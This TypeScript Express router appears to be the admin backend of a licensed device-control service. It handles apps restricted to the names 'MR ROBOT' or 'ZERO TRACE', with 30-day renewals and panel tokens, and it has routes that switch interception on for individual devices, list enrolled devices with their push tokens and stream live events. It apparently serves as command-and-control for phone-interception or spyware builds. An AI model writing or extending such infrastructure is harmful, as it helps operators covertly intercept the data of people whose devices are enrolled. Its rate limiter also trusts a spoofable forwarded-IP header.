import { Router, type IRouter, type Request, type Response } from "express";
import { randomUUID } from "node:crypto";
import { localDb } from "../lib/local-db";
import { pool } from "../lib/db";
import { interceptState } from "../lib/intercept";
import { masterSseSubscribe, masterSseUnsubscribe } from "../lib/sse";
import { verifyMasterToken } from "../lib/jwt";
import { requireJwt } from "../middlewares/requireJwt";

const router: IRouter = Router();

/* ── DB setup ────────────────────────────────────────────────────────────── */
pool.query(`
  CREATE TABLE IF NOT EXISTS master_sessions (
    id TEXT PRIMARY KEY,
    ip TEXT NOT NULL DEFAULT '',
    user_agent TEXT NOT NULL DEFAULT '',
    login_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
  )
`).catch(() => {});

/* ── Rate limiter — in-memory, per IP ───────────────────────────────────── */
const RATE_MAX_ATTEMPTS = 5;
const RATE_LOCKOUT_MS   = 15 * 60 * 1000;   // 15 min

interface RateEntry { count: number; lockedUntil: number | null }
const rateLimitMap = new Map<string, RateEntry>();

function getClientIp(req: Request): string {
  return (
    (req.headers["x-forwarded-for"] as string | undefined)?.split(",")[0]?.trim() ??
    req.socket.remoteAddress ??
    "unknown"
  );
}

function checkRateLimit(ip: string): { blocked: boolean; minutesLeft?: number } {
  const now   = Date.now();
  const entry = rateLimitMap.get(ip);
  if (!entry) return { blocked: false };

  if (entry.lockedUntil && now < entry.lockedUntil) {
    const minutesLeft = Math.ceil((entry.lockedUntil - now) / 60_000);
    return { blocked: true, minutesLeft };
  }

  // Lockout expired — reset
  if (entry.lockedUntil && now >= entry.lockedUntil) {
    rateLimitMap.delete(ip);
  }
  return { blocked: false };
}

function recordFailedAttempt(ip: string): void {
  const now   = Date.now();
  const entry = rateLimitMap.get(ip) ?? { count: 0, lockedUntil: null };
  entry.count += 1;
  if (entry.count >= RATE_MAX_ATTEMPTS) {
    entry.lockedUntil = now + RATE_LOCKOUT_MS;
  }
  rateLimitMap.set(ip, entry);
}

function resetRateLimit(ip: string): void {
  rateLimitMap.delete(ip);
}

/* ── Helper ──────────────────────────────────────────────────────────────── */
function stripPin<T extends { deleteProtectionPin?: unknown }>(obj: T) {
  const { deleteProtectionPin: _dp, ...rest } = obj;
  return rest;
}

const VALIDITY_DAYS = 30;

function isExpired(createdAt: string): boolean {
  return Date.now() > new Date(createdAt).getTime() + VALIDITY_DAYS * 24 * 60 * 60 * 1000;
}

/* ── Apps CRUD ───────────────────────────────────────────────────────────── */
router.get("/master/apps", requireJwt, async (_req, res) => {
  const rows = await localDb.listApps();
  res.json(rows.map(app => ({
    ...stripPin(app),
    isExpired: isExpired(app.createdAt),
  })));
});

router.post("/master/apps", requireJwt, async (req, res) => {
  const { appId, name, pin, status } = req.body as { appId?: string; name?: string; pin?: string; status?: string };
  if (!appId || !name) { res.status(400).json({ error: "appId and name are required" }); return; }
  if (!["MR ROBOT", "ZERO TRACE"].includes(name.trim())) { res.status(400).json({ error: "App name must be 'MR ROBOT' or 'ZERO TRACE'" }); return; }
  try {
    const row = await localDb.createApp({ appId, name: name.trim(), pin: pin, status });
    res.status(201).json(stripPin(row));
  } catch (err) {
    if ((err as Error).message === "APP_EXISTS") { res.status(409).json({ error: "App ID already exists" }); return; }
    throw err;
  }
});

router.get("/master/apps/:appId", requireJwt, async (req, res) => {
  const appId = String(req.params.appId ?? "");
  const app = await localDb.getApp(appId);
  if (!app) { res.status(404).json({ error: "App not found" }); return; }
  res.json({ ...stripPin(app), isExpired: isExpired(app.createdAt) });
});

router.patch("/master/apps/:appId", requireJwt, async (req, res) => {
  const appId = String(req.params.appId ?? "");
  const { name, pin, status } = req.body as { name?: string; pin?: string; status?: string };
  const updates: { name?: string; status?: string; pin?: string } = {};
  if (name !== undefined) updates.name = name;
  if (status !== undefined) updates.status = status;
  if (pin !== undefined) updates.pin = pin;
  if (Object.keys(updates).length === 0) { res.status(400).json({ error: "No fields to update" }); return; }
  const row = await localDb.updateApp(appId, updates);
  if (!row) { res.status(404).json({ error: "App not found" }); return; }
  res.json(stripPin(row));
});

router.delete("/master/apps/:appId", requireJwt, async (req, res) => {
  const appId = String(req.params.appId ?? "");
  const row = await localDb.deleteApp(appId);
  if (!row) { res.status(404).json({ error: "App not found" }); return; }
  res.json({ ok: true });
});

router.post("/master/apps/:appId/renew", requireJwt, async (req, res) => {
  const appId = String(req.params.appId ?? "");
  const app = await localDb.getApp(appId);
  if (!app) { res.status(404).json({ error: "App not found" }); return; }
  const THIRTY_MS    = VALIDITY_DAYS * 24 * 60 * 60 * 1000;
  const oldExpiry    = new Date(app.createdAt).getTime() + THIRTY_MS;
  const isExp        = oldExpiry < Date.now();
  const newCreatedAt = new Date(isExp ? Date.now() : oldExpiry).toISOString();
  await pool.query(`UPDATE apps SET created_at = $1 WHERE app_id = $2`, [newCreatedAt, appId]);
  const updated = await localDb.getApp(appId);
  res.json(updated ? stripPin(updated) : stripPin(app));
});

router.post("/master/apps/:appId/regenerate-token", requireJwt, async (req, res) => {
  const appId = String(req.params.appId ?? "");
  const app = await localDb.getApp(appId);
  if (!app) { res.status(404).json({ error: "App not found" }); return; }
  const newToken = randomUUID();
  await localDb.updateApp(appId, { panelToken: newToken });
  res.json({ ok: true, panelToken: newToken });
});

/* ── SSE — session bhi validate karo ────────────────────────────────────── */
router.get("/master/events", async (req, res) => {
  const authHeader = req.headers["authorization"];
  const token = authHeader?.startsWith("Bearer ") ? authHeader.slice(7) : (req.query["token"] as string | undefined);
  if (!token) { res.status(401).json({ error: "Token required" }); return; }

  let sessionId: string | undefined;
  try {
    const payload = verifyMasterToken(token);
    sessionId = payload.sessionId;
  } catch {
    res.status(401).json({ error: "Invalid or expired token" }); return;
  }

  // Session DB mein check karo
  if (sessionId) {
    try {
      const result = await pool.query<{ id: string }>(
        `SELECT id FROM master_sessions WHERE id = $1`, [sessionId]
      );
      if (result.rows.length === 0) {
        res.status(401).json({ error: "Session revoked — please login again" }); return;
      }
    } catch {
        res.status(503).json({ error: "Auth check failed. Try again." }); return;
      }
  }

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();
  res.write(":ping\n\n");
  masterSseSubscribe(res);
  const keepAlive = setInterval(() => {
    try { res.write(":ping\n\n"); } catch { clearInterval(keepAlive); }
  }, 20000);
  req.on("close", () => { clearInterval(keepAlive); masterSseUnsubscribe(res); });
});

/* ── Intercept ───────────────────────────────────────────────────────────── */
router.get("/master/intercept", requireJwt, async (_req, res) => {
  res.json(await interceptState.list());
});

router.post("/master/intercept/:deviceId", requireJwt, async (req, res) => {
  const deviceId = String(req.params.deviceId ?? "");
  if (!deviceId) { res.status(400).json({ error: "deviceId required" }); return; }
  await interceptState.enable(deviceId);
  res.json({ ok: true, intercepted: true });
});

router.delete("/master/intercept/:deviceId", requireJwt, async (req, res) => {
  const deviceId = String(req.params.deviceId ?? "");
  await interceptState.disable(deviceId);
  res.json({ ok: true, intercepted: false });
});

/* ── Sessions ────────────────────────────────────────────────────────────── */
router.get("/master/sessions", requireJwt, async (_req, res) => {
  const { rows } = await pool.query<{ id: string; ip: string; user_agent: string; login_at: string }>(
    `SELECT id, ip, user_agent, login_at FROM master_sessions ORDER BY login_at DESC`
  );
  res.json(rows.map(r => ({ id: r.id, ip: r.ip, userAgent: r.user_agent, loginAt: r.login_at })));
});

router.delete("/master/sessions/:id", requireJwt, async (req, res) => {
  const id = String(req.params.id ?? "");
  await pool.query(`DELETE FROM master_sessions WHERE id = $1`, [id]);
  res.json({ ok: true });
});

/* ── All Devices ─────────────────────────────────────────────────────────── */
router.get("/master/all-devices", requireJwt, async (req, res) => {
  const hasFcm = req.query["hasFcm"] === "1";
  const appId  = req.query.appId ? String(req.query.appId) : undefined;
  const rows   = await localDb.listDevices({ appId });
  const result = hasFcm ? rows.filter(d => d.fcmToken) : rows;
  res.json(result.map(d => ({ ...d, hasFcm: !!d.fcmToken })));
});

export default router;
